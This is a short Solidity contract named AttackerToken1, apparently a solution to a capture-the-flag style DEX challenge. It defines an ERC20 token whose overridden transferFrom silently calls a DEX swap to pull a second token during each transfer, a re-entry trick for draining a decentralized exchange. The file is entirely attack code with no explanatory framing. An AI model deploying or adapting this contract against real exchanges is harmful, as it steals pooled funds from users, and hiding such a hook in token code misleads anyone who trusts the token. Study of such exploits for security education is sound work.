pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract AttackerToken1 is ERC20 {
    address private _dex;
    address private _token2;

    constructor(string memory name, string memory symbol, uint256 initialSupply, address dexAddress, address token2Address) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexAddress;
        _token2 = token2Address;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        IERC20 token2 = IERC20(_token2);
        (bool success,) = _dex.call(abi.encodeWithSelector(0xdba1e3a4, _token2, address(this), 1)); // Call Dex's swap with token2 -> this
        return super.transferFrom(sender, recipient, amount);
    }
}
